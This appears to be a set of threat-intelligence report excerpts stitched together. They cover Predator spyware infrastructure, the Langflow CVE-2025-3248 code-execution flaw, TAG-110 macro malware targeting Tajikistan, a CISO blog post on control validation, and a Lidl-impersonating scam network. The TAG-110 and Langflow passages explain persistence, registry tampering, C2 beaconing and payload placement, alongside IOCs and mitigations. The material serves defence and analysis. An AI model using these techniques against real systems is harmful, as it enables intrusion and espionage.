        <p><strong><em>Table 1:</em></strong> <em>Domains and IP addresses linked to Predator customer located in Mozambique (Source: Recorded Future)</em></p>
        <p>Although there has been no public reporting to date linking Predator to Mozambique, earlier investigations have connected the country to other forms of surveillance. In 2021, a report, drawing on a <a href="https://citizenlab.ca/2018/09/hide-and-seek-tracking-nso-groups-pegasus-spyware-to-operations-in-45-countries/">2018 Citizen Lab analysis</a>, <a href="https://www.brookings.edu/articles/how-digital-espionage-tools-exacerbate-authoritarianism-across-africa/">suggested</a> that Mozambique was likely a Pegasus operator (there were no confirmed Pegasus infections within Mozambique at that time). Additionally, a 2016 report by the Mozambican investigative outlet Verdade <a href="https://advox.globalvoices.org/2016/05/16/the-government-of-mozambique-is-spying-on-its-citizens-according-to-verdade/">revealed</a> that the government had acquired and was using advanced surveillance technologies to monitor citizens’ communications.</p>
        <h4>Additional Cluster Linked to Eastern European Country</h4>
        <p>While many of the identified domains and IP addresses can be attributed to specific suspected operators in particular countries, attribution is less straightforward in other cases. Technical indicators frequently connect multiple domains and IP addresses into distinct clusters, which Insikt Group assesses are likely controlled by the same operator.</p>
        <p>One such cluster was notable for its brief period of activity. Recorded Future Network Intelligence indicates this cluster was active only from August to November 2024 and likely consisted of just two sets of Tier 1 to Tier 4 servers. This cluster could represent testing and development operations due to its brevity, or it could be linked to an Eastern European operator on account of its location. Currently, <em>speedbrawse[.]com</em> is the sole domain associated with this cluster. Insikt Group assesses that the abrupt halt in activity of this operator may also be linked to the <a href="https://home.treasury.gov/news/press-releases/jy2581">escalation</a> of sanctions against Intellexa in September 2024.</p>
        <h3>Connection to Czech Entity</h3>
        <p>During the investigation into the use of Predator against the Greek journalist Thanasis Koukakis and others, Greece’s Supreme Court prosecutor <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/">directed</a> the financial police to compile a report on companies connected to the Intellexa Consortium — a document later obtained by the Czech investigative outlet Investigace.cz. This report features a supplier table listing entities associated with Intellexa, including an individual named Dvir Horef Hazan. He, along with the connections described in the report, is shown in <strong>Figure 6</strong>.</p>

          </div>
        </div>
        <p>Investigations by the Czech outlet <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/">found</a> that Hazan, a Czech bistro owner, programmer, and entrepreneur with ownership of at least eight Czech companies, with four specializing in marketing, consulting, and IT advisory, allegedly worked for Intellexa. Greek police reports show that Intellexa transferred nearly €3 million to Hazan and three of his companies (Zambrano Trade s.r.o., Hadastech s.r.o., and Shilo s.r.o.) for unspecified services. Additionally, Importgenius records reveal that Hadastech, solely directed by Hazan, received 40 shipments from an unidentified Ukrainian company between 2020 and 2021, described as mobile phones and "other networking apparatus."</p>
        <p>Further analysis shows that Hazan is also indirectly linked to FoxITech s.r.o., a Czech company based in Krnov and owned by Michal Ikonomidis, which claims to provide integrated IT and business services, including software development, cybersecurity, HR recruitment, and back-office support, to clients globally. More specifically, FoxITech s.r.o. is headquartered in a building owned by one of Hazan’s companies, which also houses the other previously mentioned Hazan-owned businesses. This link between Hazan and FoxITech s.r.o. is further evidenced by Hazan and Ikonomidis appearing to be friends, based on social media, and the fact that Hazan’s first company and FoxITech s.r.o. were both registered at the notary’s office by the same proxy. Moreover, RIPE (Réseaux IP Européens) entries linked to FoxITech s.r.o. include email addresses associated with Hazan’s company, Shilo s.r.o. According to Investigace.cz, an email sent to FoxITech s.r.o. was answered from an address belonging to one of Hazan’s companies, Bender ONE s.r.o.</p>
        <p>Although the precise nature and purpose of the connection between FoxITech s.r.o. and Predator operations remain unclear, Insikt Group has observed that Tier 4 servers regularly communicate with Tier 5 infrastructure, which is linked to FoxITech s.r.o. This establishes a link between Predator’s multi-tiered infrastructure and the Czech entity, marking the first technical connection made between Predator infrastructure and corporate entities associated with the Intellexa Consortium.</p>
        <p>Notably, Investigace.cz previously <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/">reported</a> on Cytrox in the Czech Republic, revealing that the company’s listed director was a pensioner from a village near Ostrava, unaware of Intellexa. She knew Hazan, a family acquaintance living nearby. Also, her daughter’s husband, Amos Uzan, is an Israeli who worked in government security and communications roles from 2003–2009, during Ehud Olmert’s tenure as Prime Minister. Olmert had previously disclosed that he was a paid advisor to Intellexa between 2006 to 2009.</p>
        <h2>Outlook</h2>
        <p>Insikt Group has uncovered evidence indicating the continued use of Predator, including in Mozambique, despite widespread media attention and sanctions targeting Intellexa and related entities. Although recent activity has been observed, the reduced number of suspected operators compared to earlier reports suggests that public exposure, sanctions, and related measures have likely imposed operational costs on Intellexa. Moreover, while Predator operators historically maintained a consistent modus operandi, the latest findings reveal the adoption of new tactics to evade detection. Sanctions and other pressures are likely to drive efforts to increase the complexity of corporate structures, making operations harder to trace and disrupt. The continued spread of Predator and similar spyware products, as well as the availability of hack-for-hire services beyond legitimate law enforcement and counterterrorism uses, presents a significant risk to a broad range of organizations and individuals.</p>

On May 5, 2025, the US Cybersecurity and Infrastructure Security Agency (<a href="https://www.cisa.gov/">CISA</a>) also added CVE-2025-3248 to its <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">Known Exploited Vulnerabilities (KEV) catalog</a>. Exploiting the vulnerability can allow remote, unauthenticated attackers to send crafted HTTP requests and execute arbitrary code by abusing Python decorators and default arguments.</p>
        <p>Given the high risk associated with this vulnerability and ongoing exploitation attempts, it is imperative to prioritize patching CVE-2025-3248 on your company's assets to prevent unauthorized access and attackers potentially taking control of affected systems.</p>
        <h4>Insikt Group’s Assessment of CVE-2025-3248</h4>
        <p>CVE-2025-3248 arises from Langflow’s failure to implement appropriate input sanitization and execution control at the "/api/v1/validate/code" endpoint, where it insecurely uses Python’s "compile" and "exec()" function to process user-supplied code. Specifically, the vulnerability results from Langflow’s approach of validating function definitions by parsing them into an Abstract Syntax Tree (AST) and executing specific components.</p>
        <p>The endpoint parses the user-submitted code field using "ast.parse()" to construct an AST. Langflow then uses Python’s compile function to convert the parsed AST into executable bytecode. During AST processing, Python evaluates argument default values and decorators immediately upon compilation. This evaluation occurs when the AST node representing the function is processed, not strictly during the ast.parse() step. If these components contain malicious payloads, they are executed as part of the compilation and execution phase.</p>
        <p>Unauthenticated attackers can therefore craft malicious payloads embedded within argument defaults or decorators. Since Langflow does not enforce input validation or sandboxing, these payloads are compiled and executed within the server context, leading to remote code execution (RCE). In vulnerable versions, remote threat actors can submit specially crafted POST requests to the endpoint, potentially deploying reverse shell commands, data exfiltration scripts, or other malicious code without authentication or adequate restriction.</p>
        <p>At the time of writing, there were 1,050 exposed Langflow instances on Shodan. However, not all of these are necessarily vulnerable as their specific versions are unknown. Additionally, cybersecurity firm Greynoise observed 361 malicious IP addresses attempting to exploit CVE-2025-3248, primarily targeting systems in the US, Australia, Singapore, Germany, and Mexico.</p>

        <h2>Executive Summary</h2>
        <p>From January to February 2025, Insikt Group detected a phishing campaign targeting Tajikistan that Insikt Group attributes to TAG-110, a Russia-aligned threat actor that overlaps with UAC-0063 and has been linked to APT28 (BlueDelta) with medium confidence by CERT-UA. In this campaign, TAG-110 leveraged Tajikistan government-themed documents as lure material, consistent with its historical use of trojanized legitimate government documents, though the authenticity of the current samples could not be independently verified. These documents were distinct from those used in previous campaigns (<a href="/research/russia-aligned-tag-110-targets-asia-and-europe">1</a>, <a href="https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia">2</a>, <a href="https://cert.gov.ua/article/6280129">3</a>, <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">4</a>), notably lacking an embedded <a href="https://learn.microsoft.com/en-us/previous-versions/ms536495(v=vs.85)">HTA</a>-based payload HATVIBE within them, which TAG-110 has deployed since at least 2023. In this campaign, TAG-110 has shifted to using macro-enabled Word template files (.dotm files) rather than HATVIBE for the initial payload. Given TAG-110’s historical targeting of public sector entities in Central Asia, this campaign is likely targeting government, educational, and research institutions within Tajikistan.</p>
        <p>Russia’s Central Asian policy centers on preserving a post‑Soviet sphere of influence by embedding itself at the core of the region’s security, economic, and political architecture. TAG-110's activities continue to bolster this policy through intelligence-gathering operations. Insikt Group anticipates TAG‑110 will sustain regional operations against government ministries, academic and research bodies, and diplomatic missions, particularly those involved in upcoming elections, military operations, or other events the Kremlin wishes to influence.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>TAG-110 has changed its spearphishing tactics in recent campaigns against Tajikistan, as they now rely on macro-enabled Word templates (.dotm files).</li>
          <li>This campaign has been attributed to TAG-110 based on its reuse of VBA code found in lures from previous campaigns, overlap in C2 infrastructure, and use of suspected legitimate government documents for lure material.</li>
          <li>TAG-110’s persistent targeting of Tajik government, educational, and research institutions supports Russia’s strategy to maintain influence in Central Asia. These cyber-espionage operations likely aim to gather intelligence for influencing regional politics or security, particularly during sensitive events like elections or geopolitical tensions.</li>
          <li>TAG-110’s recent use of macro-enabled Word templates (.dotm), placed in the Microsoft Word STARTUP folder for automatic execution, highlights a tactical evolution prioritizing persistence. Organizations should monitor the Word STARTUP directory for unauthorized additions and enforce strict macro security policies.</li>
        </ul>
        <h2>Background</h2>
        <p>TAG-110 is a Russia-aligned threat actor overlapping with UAC-0063, which has been linked to APT28 (BlueDelta) with medium confidence by CERT-UA. TAG-110 has conducted cyber-espionage campaigns primarily targeting Central Asia since <a href="https://cert.gov.ua/article/4697016?fbclid=IwAR1B5gj0v-Ve9Q5299ydM5lrInLuKVmvPRosQkUucq6YzcjuTgVnM_x3LjQ">at least 2021</a>. Historically, this group has been known for its use of macro-enabled Word documents to deliver malicious payloads such as HATVIBE, an HTA-based malware designed for initial access and persistence. In November 2024, Insikt Group <a href="/research/russia-aligned-tag-110-targets-asia-and-europe">highlighted</a> TAG-110’s use of HTA-embedded spearphishing attachments in emails tailored for Central Asian diplomatic entities. TAG-110’s operations have been documented by organizations such as <a href="https://cert.gov.ua/article/4697016?fbclid=IwAR1B5gj0v-Ve9Q5299ydM5lrInLuKVmvPRosQkUucq6YzcjuTgVnM_x3LjQ">CERT-UA</a>, <a href="https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia">BitDefender</a>, and <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">Sekoia</a>, with recent campaigns targeting entities in Kazakhstan, Uzbekistan, and other Central Asian states. TAG-110 continues to use a variety of custom malware families to conduct espionage activities, including CHERRYSPY (DownExPyer), LOGPIE, and PyPlunderPlug.</p>
        <h2>Threat Analysis</h2>
        <p>Beginning in January 2025, Insikt Group detected new TAG-110 first-stage payloads, which suggested the threat actors were evolving their tactics. Previously, TAG-110 leveraged macro-enabled Word documents to deliver HATVIBE, an HTA-based malware, for initial access. The newly detected documents do not contain the embedded HTA HATVIBE payload for creating a scheduled task and instead leverage a global template file placed in the Word startup folder for persistence.</p>

        <p>The first document (<strong>Figure 1</strong>) appears to be a notice to the armed forces of Tajikistan themed on ensuring radiation safety. Machine translation incorrectly translated “РТ” as “Republic of Tartarstan,” but in the wider document context, “PT” likely refers to the “Republic of Tajikistan,” as “Республика Таджикистан” is used in place of “PT” later in the document. Insikt Group has not been able to verify the authenticity of the document, but TAG-110 has <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">historically</a> used legitimate documents as lures.</p>

        <h3>Analysis of Sub Procedures</h3>
        <h4>Document_Open() Sub Procedure</h4>
        <p>Upon opening the malicious file, the document.open <a href="https://learn.microsoft.com/en-us/office/vba/api/word.document.open">event</a> is triggered, and the remaining code will:</p>
        <ul>
          <li>Unprotect the document using the key "gyjyfyjrtjrtjhfgjfrthrtj"</li>
          <li>Hide spelling errors</li>
          <li>Attempt to set the font line width to 0</li>
          <li>Copy itself to the Word startup folder (%APPDATA%\Microsoft\Word\STARTUP&lt;filename&gt;.dotm) in <a href="https://learn.microsoft.com/en-us/office/vba/api/word.wdsaveformat">XML template format with macros enabled</a> for persistence</li>

        </div>
        <h4>AutoExec() Sub Procedure</h4>
        <p>Once the document has been added to the Word startup folder, it is treated as a global template and will run the <a href="https://learn.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros">automatic macro</a> AutoExec every time Microsoft Word is started. The AutoExec macro completes the following operations:</p>
        <ul>
          <li>Checks to see the last time Microsoft Word was started; this is <a href="https://learn.microsoft.com/en-us/office/vba/api/word.system.profilestring">stored and maintained</a> by the global template in the registry location HKEY_CURRENT_USER\Software\Microsoft\Office&lt;Version&gt;\Word\Options\LastTime -- If the value of LastTime is less than 60 seconds, AutoExec will end execution</li>
          <li>Collects the following system information and stores it in JSON format: -- Computer name -- Username -- Region -- Monitor resolution -- Language -- System version</li>
          <li>Waits three seconds before executing the getInfo()Sub procedure, per Figure 5.</li>

        </div>
        <h4>getInfo() Sub Procedure</h4>
        <p>The getInfo() Sub procedure initiates communication between the victim and the C2 server. The procedure accomplishes this by completing the following operations:</p>
        <ul>
          <li>Creates an HTTP request object and makes an HTTP POST to the URL <code>http://38.180.206[.]61/engine.php</code></li>
          <li>Per <strong>Figure 7</strong>, the HTTP request has the following characteristics:
            <ul>
              <li>Content-type header set to application/x-www-form-urlencoded</li>
              <li>User-Agent header set to a Base64-encoded ID unique in both samples</li>
              <li>POST data in the format of opamczqwe=&amp;ywalokmsz=</li>
            </ul>
          </li>
          <li>If the C2 server’s response starts with "%%%%,"” the Sub procedure will take the rest of the string after it and use that as the argument in the start Sub procedure</li>
          <li>If the server HTTP response does not start with "%%%%," it will wait ten seconds and try again until it gets a response starting with “%%%%”</li>
          <li>The sample d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 makes use of a count loop where the collected data is only sent in every tenth HTTP POST, whereas the sample 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 will only send the collected data on the first HTTP POST</li>

        <h4>start() Sub Procedure</h4>
        <p>The start() Sub procedure is likely used to execute additional VBA supplied in C2 responses. The Sub procedure accomplishes this by completing the following operations:</p>
        <ul>
          <li>It splits the remaining C2 response, using the string “###” as a delimiter, and stores the values into an array</li>
          <li>This array of strings is used as variables, likely to create a block of code similar to those used in previous TAG-110 macro-enabled Word documents, such as 6ac6a0dd78d2e3f58e95fa1a20b3ab22b4b49a1ab816dcfb32fd6864e1969ac3, as seen in Figure 8</li>
          <li>The array values are used to create a COM object (likely WScipt.shell based on code overlap from previous VBA code used by TAG-110) and written to a value in the registry
            <ul>
              <li>This is likely modifying HKEY_CURRENT_USER\Software\Microsoft\Office\\Word\Security\AccessVBOM in the registry, as this tactic was used in the previous campaigns</li>
              <li>This registry modification allows VBA macros to modify and access other VBA projects</li>
            </ul>
          </li>
          <li>Another COM object (likely Word.Application based on code overlap from previous VBA code used by TAG-110) will launch Microsoft Word in the background, create a new document inside that Microsoft Word instance, add a VBA module, and execute it after three seconds</li>
        </ul>

        <h3>Malicious Infrastructure</h3>
        <p>The files d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 and 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 share the same C2 server, 38.180.206[.]61. This IP address was previously identified as a HATVIBE C2 server and attributed to TAG-110 by <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">Sekoia</a>. At the time of analysis, Insikt Group could not obtain additional second-stage VBA modules. However, based on TAG-110’s historical activity and tool set, it is likely that successful initial access via the macro-enabled templates would result in the deployment of additional malware, such as HATVIBE, CHERRYSPY, LOGPIE, or potentially a new, custom-developed payload designed for espionage operations.</p>
        <h2>Mitigations</h2>
        <ul>
          <li>Monitor for and alert on creating or modifying global template files in the Microsoft Word startup folder, which may indicate persistent macro abuse.</li>
          <li>Detect and investigate registry modifications to AccessVBOM under HKEY_CURRENT_USER\Software\Microsoft\Office&lt;Version&gt;\Word\Security, which may signal attempts to enable or manipulate VBA macro behavior.</li>
          <li>Disable macros by default in Microsoft Office applications and implement Group Policy Objects (GPOs) to prevent users from enabling them unless explicitly approved.</li>
          <li>Use Recorded Future® Threat Intelligence to monitor for newly emerging TAG-110 infrastructure, malware signatures, and phishing document indicators.</li>
          <li>Integrate Recorded Future Threat Intelligence Modules into SIEM and SOAR platforms to receive real-time alerts on activity linked to TAG-110 and other Russia-aligned threat actors.</li>
        </ul>
        <h2>Outlook</h2>
        <p>Based on current and past Insikt Group reporting, TAG-110 has consistently used macro-enabled spearphishing documents to deliver malware and establish persistence in target environments. Insikt Group expects TAG-110 to continue leveraging regional events and bureaucratic themes to craft their lures. We also expect the targeting of entities related to government, defense, or public infrastructure in Central Asia to persist, especially around sensitive events such as elections or military activity.</p>

            <description><![CDATA[Explore how CISOs can transition from audit checkmarks to genuine cyber resilience through continuous control validation. Insights from RSA 2025 on redefining cybersecurity strategies.]]></description>
            <content:encoded><![CDATA[
        <p>RSA is always a good opportunity to reconnect with industry friends—2025 was no exception. Beneath the marketing avalanche of “AI-enabled everything,” one theme stuck out in conversations with CISOs and defensive leaders: the mounting time and energy spent on cyber audits, reporting, and remediation.</p>
        <p>These Enterprise Risk Management (ERM) and Governance, Risk, and Compliance (GRC) efforts are especially demanding in regulated industries. But with mandates like <a href="https://digital-strategy.ec.europa.eu/en/policies/nis2-directive">NIS2</a> and <a href="https://finance.ec.europa.eu/regulation-and-supervision/financial-services-legislation/implementing-and-delegated-acts/digital-operational-resilience-regulation_en">DORA</a> taking effect in Europe—and domestic frameworks like <a href="https://www.isaca.org/resources/isaca-journal/issues/2022/volume-6/are-it-general-controls-outdated">SOX</a>, <a href="https://www.aicpa-cima.com/resources/download/trust-services-criteria">SOC2</a>, and <a href="https://dodcio.defense.gov/CMMC/Documentation/">CMMC</a> still in play—security leaders are spending more time with audit committees than ever before.</p>
        <h2>Compliance Theater: Starring the Risk Register</h2>
        <p>In enterprises, defensive resource allocations are often adjudicated by committees and measured by audit progress and the almighty risk register. This means most of the attention (and budget) aligns with avoiding one specific risk: legal or compliance failure (LCF). It’s no surprise that CISOs are often left with a single 15-minute slot each year to brief the board on the <a href="https://intelligence2risk.substack.com/p/five-risk-categories">other four cyber risk impacts</a>. That’s a missed opportunity.</p>
        <div>

            <div><em>Board presentation produced by ChatGPT 4o.</em></div>
          </div>
        </div>
        <p>Boards need to better understand cyber risk beyond compliance. The <a href="https://intelligence2risk.substack.com/p/the-resilience-dilemma">“state of rizz” (resilience)</a> depends on more than audit checklists. Point-in-time audits work well for demonstrating regulatory due diligence. If something goes wrong, but the virtual paperwork shows that policies were followed and corrections made, enforcement actions can often be minimized or avoided.</p>
        <p>That’s not true for the other risk impacts—operational disruption, financial fraud, brand impairment, and competitive disadvantage. Even after clean audits, the residual risk across these domains remains. Boards need to grasp this difference. And CISOs must continue translating technical risk into business language that supports resilience conversations.</p>
        <h2>Measuring Rizz: Easier Said Than Sustained</h2>
        <p>Communicating rizz is momentary. Measuring it is constant. Organizations spend heavily to prevent all five impacts, but security investments tied to non-compliance impacts often receive less scrutiny (<a href="https://www.isaca.org/resources/isaca-journal/issues/2015/volume-1/return-on-security-investment15-things-to-consider">ROSI</a>). That’s where control validation comes in.</p>

        </div>
        <p>Looking ahead (meaning, likely six months from now), AI agents will monitor and challenge other AI agents in continuous loops of control testing and remediation, especially as adversary TTPs evolve daily.</p>
        <h2>The Automation Angle: Purple Teams and Silver Bullets</h2>
        <p>Until then, automation in purple teaming, breach and attack simulation (BAS), and exposure validation is the best way to scale defenses without burning out staff.</p>
        <p>A growing number of vendors (like <a href="https://www.picussecurity.com/">Picus</a>) offer automated testing platforms with user-friendly workflows. These platforms aren’t silver bullets, but they help CISOs tell a better executive story.</p>

        </div>
        <p>Consider <a href="https://www.neo.space/blog/business-email-compromise-attacks">Business Email Compromise (BEC)</a>. GRC will enforce controls like phishing simulations and financial separation of duties to satisfy <a href="https://tipalti.com/resources/learn/internal-controls-for-accounts-payable/">LCF (Limit Control Frameworks)</a> requirements. But if the CISO is also emulating attacks and testing the actual tech stack—email gateways, MFA, IAM policies—the story becomes richer. It shows intentional, tested resilience across financial fraud risk, not just paper compliance. It’s far more compelling than: “We have an EDR as prescribed in our compliance framework.”</p>
        <h2>Real Rizz Moves: How Live Threat Emulation Beats Paper Promises</h2>
        <p>To make this real, draw from live TTPs observed in the wild. For example, within the past 90 days (as of May 14, 2025), Recorded Future’s AI Insights flagged dozens of events that could be used as fuel for BAS automation.</p>

            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>On April 19, 2025, Recorded Future® Payment Fraud Intelligence identified lidlorg[.]com as a likely purchase <a href="/research/scam-websites-take-advantage-of-seasonal-openings">scam website</a> that employs <a href="/research/eriakos-scam-campaign-detected">brand impersonation</a> against a German international discount retailer. As of May 8, 2025, our analysis has linked <em>lidlorg[.]com</em> to a network of 71 likely purchase <a href="/research/black-friday-trends-insights-mitigating-online-shopping-scams">scam websites</a>, including others that combine brand impersonation and online ad campaigns for propagation. All identified scam websites use one or more of twelve shared merchant accounts to process visitor transactions. All transactions with these merchant accounts are highly likely to be fraudulent and facilitate <a href="/blog/from-breach-to-fraud-payment-card-lifecycle">card compromise</a>.</p>
        <p>Purchase scams present <a href="/industry/financial">financial fraud risks</a> to card issuers and <a href="/blog/navigating-cybersecurity-landscape-with-the-risk-business">compliance risks</a> to merchant acquirers, especially in cases where linked scam merchant accounts are also abused to support transaction laundering activity. To reduce these risks, card issuers should take action against identified merchant accounts and card accounts that have transacted with those merchants, while merchant acquirers should take action against the merchant accounts. We describe these mitigation strategies in detail in the Mitigations section of this report.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>On April 19, 2025, we identified lidlorg[.]com as a likely purchase scam website that uses brand impersonation against a German retailer.</li>
          <li>The scam website lidlorg[.]com is likely part of a network of 71 purchase scam domains using the same merchant accounts to defraud victims and steal victim data.</li>
          <li>Transactions with the merchant accounts linked to lidlorg[.]com are highly likely to be fraudulent and facilitate card compromise. These merchant accounts include AKRU KERAMIK GMBH, ANT <em>ONLINE E-COMMERCE STO, BALSAMIC, CLOTHWEARABLY, LMS AESTHETICS, MYCOZYBABIES, ONCLOTHESSHOES, PETHOUSEN LLC, REFINEDHAT, YSP</em> CLOTHINGGSHOP, YSP <em>NIHILSTOOL, and YSP</em> QHWLKJSHOP.</li>
          <li>It is unclear whether the network of scam domains and merchant accounts is controlled by a single threat actor or various threat actors acting in concert — for example, through partnership on the dark web and the provision of dark web-based services in a greater scam ecosystem.</li>
          <li>To attribute this scam network to a single threat actor or various threat actors, card issuers and merchant acquirers with access to merchant data can likely leverage commonalities in associated merchant registration information, such as company data.</li>
        </ul>
        <h2>Threat Analysis of Purchase Scam Websites</h2>
        <p><strong>On April 19, 2025, Recorded Future identified lidlorg[.]com as a likely purchase scam website.</strong> The operators of <em>lidlorg[.]com</em> employed brand impersonation targeting a German international discount retailer chain, as indicated by the use of typosquatting in the domain name and the abuse of a brand logo by “<a href="https://www.facebook.com/profile.php?id=61573499135719">EU STORE</a>” and “<a href="https://www.facebook.com/profile.php?id=61574165562569">L Clearance</a>”, two advertiser accounts <a href="https://www.facebook.com/ads/library/?active_status=all&amp;ad_type=all&amp;country=ALL&amp;is_targeted_country=false&amp;media_type=all&amp;q=%22lidlorg.com%22&amp;search_type=keyword_exact_phrase">linked</a> to <em>lidlorg[.]com</em> (<strong>Figure 1</strong>). The scam website likely defrauds victims through the use of three linked merchant accounts, which enable the operator to conduct a fraudulent scam transaction while stealing victim personal and financial data for downstream fraud.</p>
        <p><strong>Recorded Future</strong> <strong><a href="/products/payment-fraud-intelligence">Payment Fraud Intelligence</a></strong> <strong>distinguishes purchase scam websites from phishing websites through their use of linked merchant accounts.</strong> While the purchase scams we identify are similar to other online scams (especially in their reliance on fraudulent offers for goods and services that buyers will never receive), they are distinct from phishing websites because they can process victim payments rather than simply collecting victim data through bogus form submissions.</p>

          </div>
        </div>
        <p><strong>Our analysis indicated that</strong> <strong><em>lidlorg[.]com</em></strong> <strong>is part of a network of 71 likely scam e-commerce domains, as indicated by overlapping use of scam merchant accounts.</strong> All likely scam domains use various combinations of the same merchant accounts for their payment functionality and have been operational since no later than February 2025. Many of the domains also use typosquatting to impersonate multiple brands. At the time of our analysis, many of the domains were associated with active or historical online ad campaigns. Many of these were also removed by the ad platform for “<a href="https://transparency.meta.com/policies/ad-standards/fraud-scams/unacceptable-business-practices">Unacceptable Business Practices</a>,” which includes scam activity. On average, the domains were 65 days old and likely malicious, as indicated by their average DomainTools risk score of 88/100.</p>
        <p><strong>Figure 2</strong> illustrates the links between the identified scam domains and merchant accounts. The Appendix of this report lists the scam domains, merchant accounts, and all timestamps when we confirmed that they were linked.</p>

        <p><strong><em>Table 1:</em></strong> <em>All transactions with merchant accounts linked to lidlorg[.]com are likely to be fraudulent (Source: Recorded Future)</em></p>
        <p>Note that inaccurate associated merchant URL data suggests that threat actors likely use merchant accounts within this group for transaction laundering. For example, merchant data indicates that PETHOUSEN LLC is associated with pethousen[.]com rather than the three scam domains we linked it to (biliability[.]com, dknyonlineuk[.]com, outletmalleu[.]shop). Inaccurately associated merchant URLs often indicate that a merchant is engaging in transaction laundering.</p>
        <p><strong>Transaction laundering allows threat actors to conceal high-risk or illegal activity by processing payments for an entity, goods, or services unknown to the merchant’s acquiring bank or payment provider.</strong> While the transactions are disguised as low-risk or legitimate purchases, they are often transactions for illegal activities. In this sense, all purchase scam transactions that defraud victims are inherently a form of transaction laundering.</p>
        <p><strong>It is unclear whether the scam network identified in this report is controlled by a single threat actor or various threat actors acting in concert.</strong> Merchant account abuse for purchase scams frequently overlaps between networks of linked domains, as shown in Figure 2. While merchant accounts dispersed throughout scam networks network can have similarities that suggest a common origin or operator, the networks of scam domains linked to the merchant accounts are often distinct (for example, in their abuse of different ad platforms for propagation to victims)</p>
        <p>Because of this, we consider the two following scenarios equally likely regarding attribution of the scam network to an operator:</p>
        <ul>
          <li>Multiple networks of scam domains operated by different threat actors may be using the same merchant accounts, whose services are rented out as part of a third-party, dark web-based “cash-out” offering.</li>
          <li>A single threat actor may be controlling the domain and merchant infrastructure for the entire network, intentionally rotating the domain/merchant combinations in an attempt to obscure attribution.</li>
        </ul>
        <p><strong>An ecosystem of illicit dark web services likely supports</strong> <strong><a href="/research/how-cybercrime-gets-monetized">fraud-focused threat actors</a>.</strong> These threat actors leverage third-party services for a variety of scam use cases, including the following:</p>
        <ul>
          <li><strong>Fraud-based malvertising services:</strong> Threat actors organize illicit advertising services by compromising advertiser accounts for online ad platforms or by purchasing advertising campaigns using stolen financial data.</li>
          <li><strong>“Cash-out” services:</strong> Threat actors purvey merchant accounts under their control to other threat actors to monetize stolen card data.</li>
          <li><strong>Traffic services:</strong> Threat actors drive traffic to artificially boost malicious advertisements, including for scam websites, in search results. Alternatively, they partner with cash-out service providers to monetize existing victim traffic to scam domains.</li>
        </ul>
        <p><strong>Card issuers and merchant acquirers with access to merchant data can likely leverage merchant analysis for threat actor attribution of this scam network.</strong> Commonalities in merchant registration would likely indicate that the accounts are operated by a single threat actor, whereas discrepancies would indicate that the accounts are operated by various threat actors. Identical company data is an example of a commonality that we would expect to see in linked merchant accounts operated by a single threat actor.</p>
        <p>Note that since scam domains are easier to acquire and less resilient to detection and mitigation than merchant accounts (and therefore more expendable as infrastructure), we consider domain analysis less likely to enable threat actor attribution of this scam network.</p>
        <h2>Mitigations for Fraud Prevention</h2>
        <p>Purchase scams present financial fraud risks to card issuers and compliance risks to merchant acquirers, especially in cases where linked scam merchant accounts are also abused to support transaction laundering activity. To reduce these risks, apply the mitigation strategies described below.</p>
        <h3>Card Issuers</h3>
        <ul>
          <li>To prioritize fraud prevention over potential customer friction, immediately decline transactions with the identified scam merchant accounts and track customer card accounts that have transacted with the merchant for additional fraud signals before taking action.
            <ul>
              <li>Escalate the fraud risk score of customer accounts that attempt transactions with the merchants or flag the account for additional review.</li>
              <li>Consider the presence of additional fraud signals on flagged accounts as a high-confidence basis to reissue the customer card or apply other remediations.</li>
            </ul>
          </li>
          <li>To minimize customer friction, assess transaction data within your cardholder portfolio with the identified scam merchant accounts before taking action against either the merchant accounts or customer card accounts.
            <ul>
              <li>Bucket all customer transactions with the identified merchants.</li>
              <li>Determine a fraud incidence threshold in accordance with your organization’s risk tolerance. This threshold should be higher than the baseline fraud incidence rate observed across your portfolio.</li>
              <li>If customer transactions within the bucket exceed the fraud incidence threshold, automatically block all customer transactions with the identified merchant accounts and consider card reissue.</li>
            </ul>
          </li>
        </ul>
        <h3>Merchant Acquirers</h3>
        <ul>
          <li>
            <ul>
              <li>Analyze linked merchant domains to identify other likely fraudulent merchant accounts operated within the scam network. Card network acquirer data lookup APIs may enable merchant acquirers to search for merchant accounts based on domain.</li>
              <li>Scan merchant acquirer BIN and MCC combinations within your merchant portfolio to identify other likely fraudulent merchant accounts registered with similar merchant data or within a short period of time. Card network APIs may enable merchant acquirers to search for merchant account registrations based on acquirer BIN and MCC.</li>
              <li>Flag suspected fraudulent merchant accounts for enhanced due diligence, investigation, suspension, or termination in accordance with your risk tolerance.</li>
            </ul>
          </li>
        </ul>
        <h2>Outlook for Purchase Scam Networks</h2>
        <ul>
          <li>Our analysis has confirmed that the likely purchase scam network identified in this report has been operational since February 2025. Because we continue to confirm new scam domains within the group are operational, the scam operation appears to be ongoing. By extension, the scam operator will likely continue deploying new domains and online ad campaigns to support their scam activity, especially as old domains and ad campaigns are taken offline.</li>
